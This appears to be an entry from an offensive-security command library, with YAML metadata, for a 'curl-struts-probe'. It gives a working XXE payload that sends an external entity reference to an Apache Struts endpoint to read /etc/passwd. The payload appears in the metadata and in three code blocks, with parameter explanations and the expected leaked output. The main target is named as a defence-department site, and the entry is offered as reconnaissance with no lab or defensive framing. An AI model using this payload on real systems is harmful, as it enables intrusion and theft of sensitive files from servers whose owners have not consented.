---
id: cmd-uuid-1
data: >-
  curl -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE
  root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>"
  http://target-dod-site.com/struts/action
tags:
  - recon
  - probe
type: command
output: Response with potential file leak or Struts error
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:23:36.353Z'
verified: false
validated: true
submitted: true
---
# curl-struts-probe

## Command

```bash
curl -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>" http://target-dod-site.com/struts/action
```

## Description

This command sends a probe request to detect Apache Struts 2 by attempting an XXE-like injection; useful for initial vulnerability reconnaissance on web endpoints.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Content-Type: application/xml"` | Sets XML content type to trigger parsing | Yes |
| `-d "..."` | Payload with external entity reference | Yes |
| `http://target-dod-site.com/struts/action` | Target vulnerable endpoint | Yes |

## Examples

### Basic Usage

```bash
curl -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>" http://example.com/struts/action
```

### Advanced Usage

Add verbosity with `-v` for full headers:

```bash
curl -v -H "Content-Type: application/xml" -d "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><root>&test;</root>" http://target.com/struts/action
```

## Expected Output

If vulnerable, response may include contents of /etc/passwd or Struts error traces; otherwise, standard 404 or rejection.

## Related

- [[Related Procedure|procedures/Reconnaissance-of-Apache-Struts-2-Vulnerability]]
